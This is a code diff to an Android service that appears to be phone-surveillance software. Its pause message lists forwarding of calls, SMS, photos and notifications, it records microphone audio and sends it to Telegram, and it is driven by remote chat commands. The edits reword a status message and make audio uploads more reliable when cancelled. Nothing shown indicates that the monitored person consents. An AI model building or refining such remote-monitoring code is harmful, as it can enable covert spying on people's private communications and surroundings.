@@ -1019,7 +1019,7 @@ class MonitoringService : Service() {
             }
             "/stop" -> {
                 preferencesManager.monitoringPaused = true
-                sendToTelegram("⏸️ Monitoring paused. Send /resume to restart.")
+                sendToTelegram("⏸️ Monitoring paused (calls, SMS, photos and notification forwarding). Send /resume to restart.")
             }
             "/resume" -> {
                 preferencesManager.monitoringPaused = false
@@ -2750,6 +2750,7 @@ class MonitoringService : Service() {
         val audioFile = File(cacheDir, "audio_" + System.currentTimeMillis() + ".m4a")
         var recorder: android.media.MediaRecorder? = null
         var keepForRetry = false
+        var audioOutcome: MediaSendOutcome? = null
         activeAudioFile = audioFile
         try {
             recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
@@ -2776,7 +2777,8 @@ class MonitoringService : Service() {
                 sendToTelegram("Record failed (empty audio). Please try again.")
                 return
             }
-            when (sendAudioFile(audioFile)) {
+            audioOutcome = sendAudioFile(audioFile)
+            when (audioOutcome) {
                 MediaSendOutcome.SENT -> {
                     sendToTelegram("\uD83C\uDF99\uFE0F Audio sent (${seconds}s).")
                     flushPendingAudio()
@@ -2799,7 +2801,15 @@ class MonitoringService : Service() {
                 }
             }
         } catch (e: kotlinx.coroutines.CancellationException) {
-            try { deleteQuietly(audioFile) } catch (_: Exception) { }
+            if (audioOutcome == MediaSendOutcome.SENT) {
+                try {
+                    messageQueue.addMessage("\uD83C\uDF99\uFE0F Audio sent (${seconds}s).")
+                    MessageScheduler.scheduleMessageSend(this)
+                } catch (_: Exception) {
+                }
+            } else {
+                try { deleteQuietly(audioFile) } catch (_: Exception) { }
+            }
             throw e
         } catch (e: SecurityException) {
             try { deleteQuietly(audioFile) } catch (_: Exception) { }
